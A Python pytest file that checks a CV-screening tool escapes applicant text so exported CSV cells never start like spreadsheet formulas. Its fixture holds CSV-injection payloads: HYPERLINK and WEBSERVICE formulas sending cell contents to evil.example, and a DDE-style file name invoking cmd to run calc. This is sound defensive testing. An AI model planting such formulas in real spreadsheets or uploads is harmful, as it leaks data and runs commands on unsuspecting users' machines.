"""Outputs must be safe to open: applicant text never becomes a formula, markup or a leak."""

import csv

import pytest

from cv_screen.extract import MockExtractor
from cv_screen.pipeline import run_screening
from cv_screen.report import write_outputs

FORMULA_START = ("=", "+", "-", "@", "\t", "\r")

HOSTILE_CV = """Name: =HYPERLINK("https://evil.example/?d="&A2,"Verify")
Experience
Customer Service Agent, Example Shop - 03/2022 - present
- Answered customer emails
Languages
German: native
English: C1
Skills
=WEBSERVICE("http://evil.example/"&B2), live chat
"""


@pytest.fixture
def hostile_run(tmp_path, job, as_of):
    folder = tmp_path / "cvs"
    folder.mkdir()
    (folder / "=2+5+cmd|' -C calc'!A0.txt").write_text(HOSTILE_CV, encoding="utf-8")
    (folder / "-broken.pdf").write_bytes(b"%PDF-1.4 garbage")
    (folder / "@plain.txt").write_text("Skills\n- Excel, live chat\n", encoding="utf-8")
    return run_screening(folder, job, MockExtractor(), as_of)


def test_csv_cells_never_start_like_a_formula(hostile_run, tmp_path):
    out = tmp_path / "out"
    write_outputs(hostile_run, out)
    rows = list(csv.reader((out / "shortlist.csv").open(encoding="utf-8")))
    assert len(rows) == 4
    for row in rows[1:]:
        for cell in row:
            assert not cell.startswith(FORMULA_START), (cell, row)
    source_files = {r[rows[0].index("source_file")] for r in rows[1:]}
    assert "'=2+5+cmd|' -C calc'!A0.txt" in source_files  # escaped, not dropped
    assert "'-broken.pdf" in source_files
